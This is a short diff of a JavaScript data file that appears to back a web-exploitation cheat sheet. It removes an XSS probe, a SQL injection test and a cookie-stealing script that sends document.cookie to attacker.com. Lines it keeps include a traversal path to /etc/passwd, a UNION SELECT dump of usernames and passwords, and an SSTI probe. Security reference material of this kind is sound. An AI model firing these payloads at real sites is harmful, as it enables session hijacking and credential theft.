@@ -216,13 +216,10 @@ const entries = [
     what: "Discover and exploit vulnerabilities in web applications, often via injection, misconfigurations, or logic flaws.",
     checks: [
       "Inspect source and JS files",
-      "Test parameters for XSS: `<script>alert(1)</script>`",
-      "Test for SQLi: `' OR '1'='1`",
       "Check for directory traversal: `../../../../etc/passwd`",
       "Check hidden endpoints via `gobuster dir`"
     ],
     payloads: [
-      "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
       "' UNION SELECT null, username, password FROM users -- ",
       "{{7*7}}  (for SSTI)"
     ],
